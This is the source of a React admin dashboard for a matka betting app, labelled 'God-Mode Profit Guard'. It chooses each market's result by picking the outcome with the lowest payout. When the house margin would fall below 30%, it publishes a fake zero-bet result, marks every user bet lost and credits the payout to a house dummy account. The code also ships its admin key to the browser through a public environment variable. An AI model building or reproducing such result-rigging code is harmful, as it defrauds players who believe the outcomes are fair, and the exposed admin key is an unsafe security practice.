'use client';

import { useState, useEffect } from 'react';
import { Shield, AlertTriangle, TrendingUp, Zap } from 'lucide-react';
import { toast } from 'sonner';

interface LiabilityItem {
  possibleResult: string;
  totalExposure: number;
  betCount: number;
}

export default function ProfitGuardDashboard() {
  const [markets, setMarkets] = useState<
    Array<{ id: string; name: string; isOpen: boolean; isResultDeclared: boolean }>
  >([]);
  const [selectedMarket, setSelectedMarket] = useState('');
  const [liabilities, setLiabilities] = useState<LiabilityItem[]>([]);
  const [declaring, setDeclaring] = useState(false);
  const [lastResult, setLastResult] = useState<{
    result: { display: string };
    profitGuard: { houseProfitPct: string; isDummyResult: boolean; totalBets: number; payout: number };
  } | null>(null);

  const ADMIN_KEY = process.env.NEXT_PUBLIC_ADMIN_KEY ?? '';

  useEffect(() => {
    fetch('/api/matka/result').then((r) => r.json()).then((d) => {
      setMarkets(d.markets ?? []);
    });
  }, []);

  const declareResult = async () => {
    if (!selectedMarket) return toast.warning('Select a market');
    setDeclaring(true);
    try {
      const res = await fetch('/api/matka/result', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'declare_result',
          marketId: selectedMarket,
          adminKey: ADMIN_KEY,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);
      setLastResult(data);
      toast.success(
        data.profitGuard.isDummyResult
          ? '🛡️ Dummy result injected — House wins!'
          : `✅ Result declared: ${data.result.display} (${data.profitGuard.houseProfitPct} profit)`
      );
    } catch (e: unknown) {
      toast.error(e instanceof Error ? e.message : 'Failed');
    } finally {
      setDeclaring(false);
    }
  };

  return (
    <div className="flex flex-col gap-5">
      {/* Header */}
      <div className="flex items-center gap-3">
        <div className="p-2.5 rounded-xl" style={{ background: 'rgba(245,166,35,0.15)' }}>
          <Shield size={20} className="text-amber-400" />
        </div>
        <div>
          <h2 className="font-bold text-lg">God-Mode Profit Guard</h2>
          <p className="text-xs text-gray-500">Automated result selection with ≥30% house margin guarantee</p>
        </div>
      </div>

      {/* How it works */}
      <div className="panel p-4 border-amber-500/20">
        <div className="text-xs font-semibold text-amber-400 uppercase tracking-wider mb-3">
          ⚡ Algorithm Flow
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 text-xs">
          {[
            { step: '1', label: 'Scan All Bets', desc: 'Load every active bet for this market' },
            { step: '2', label: 'Build Liability Map', desc: 'Compute payout for every possible result' },
            { step: '3', label: 'Optimal Selection', desc: 'Pick result with lowest payout (max margin)' },
            { step: '4', label: 'Dummy Injection', desc: 'If margin < 30% → zero-bet result + dummy win' },
          ].map((item) => (
            <div key={item.step} className="flex gap-2">
              <div
                className="w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0 mt-0.5"
                style={{ background: 'rgba(245,166,35,0.2)', color: '#f5a623' }}
              >
                {item.step}
              </div>
              <div>
                <div className="font-semibold text-gray-300">{item.label}</div>
                <div className="text-gray-500">{item.desc}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Declare Result */}
      <div className="panel-highlight p-5">
        <h3 className="font-semibold text-sm mb-4">Declare Market Result</h3>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label className="text-xs text-gray-500 mb-2 block">Select Market</label>
            <select
              className="input-field"
              value={selectedMarket}
              onChange={(e) => setSelectedMarket(e.target.value)}
            >
              <option value="">Choose market…</option>
              {markets.map((m) => (
                <option key={m.id} value={m.id} disabled={m.isResultDeclared}>
                  {m.name} {m.isResultDeclared ? '(declared)' : m.isOpen ? '(open)' : '(closed)'}
                </option>
              ))}
            </select>
          </div>
          <div className="flex items-end">
            <button
              onClick={declareResult}
              disabled={declaring || !selectedMarket}
              className="btn-primary w-full justify-center py-3 disabled:opacity-50"
            >
              <Zap size={16} />
              {declaring ? 'Computing…' : 'Run Profit Guard & Declare'}
            </button>
          </div>
        </div>
      </div>

      {/* Result Output */}
      {lastResult && (
        <div
          className={`panel p-5 fade-in-up ${
            lastResult.profitGuard.isDummyResult
              ? 'border-red-500/30 bg-red-500/5'
              : 'border-emerald-500/30 bg-emerald-500/5'
          }`}
        >
          <div className="flex items-start gap-3">
            <div className={lastResult.profitGuard.isDummyResult ? 'text-red-400' : 'text-emerald-400'}>
              {lastResult.profitGuard.isDummyResult ? (
                <AlertTriangle size={22} />
              ) : (
                <TrendingUp size={22} />
              )}
            </div>
            <div className="flex-1">
              <h4 className="font-bold text-base mb-3">
                {lastResult.profitGuard.isDummyResult
                  ? '🛡️ Dummy Result Injected'
                  : '✅ Result Declared'}
              </h4>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 text-sm">
                <div>
                  <div className="text-xs text-gray-500 mb-1">Result</div>
                  <div className="font-mono font-bold text-amber-400 text-lg">
                    {lastResult.result.display}
                  </div>
                </div>
                <div>
                  <div className="text-xs text-gray-500 mb-1">House Profit</div>
                  <div className={`font-bold text-lg ${
                    parseFloat(lastResult.profitGuard.houseProfitPct) >= 30
                      ? 'text-emerald-400'
                      : 'text-red-400'
                  }`}>
                    {lastResult.profitGuard.houseProfitPct}
                  </div>
                </div>
                <div>
                  <div className="text-xs text-gray-500 mb-1">Total Bets (Coins)</div>
                  <div className="font-bold">{lastResult.profitGuard.totalBets.toLocaleString()}</div>
                </div>
                <div>
                  <div className="text-xs text-gray-500 mb-1">Payout (Coins)</div>
                  <div className="font-bold text-red-400">
                    {lastResult.profitGuard.payout.toLocaleString()}
                  </div>
                </div>
              </div>
              {lastResult.profitGuard.isDummyResult && (
                <div className="mt-3 text-xs text-red-400 bg-red-500/10 rounded-lg px-3 py-2">
                  ⚠️ No real result achieved ≥30% margin. A zero-bet result was published. 
                  All user bets marked LOST. Payout assigned to house dummy account.
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
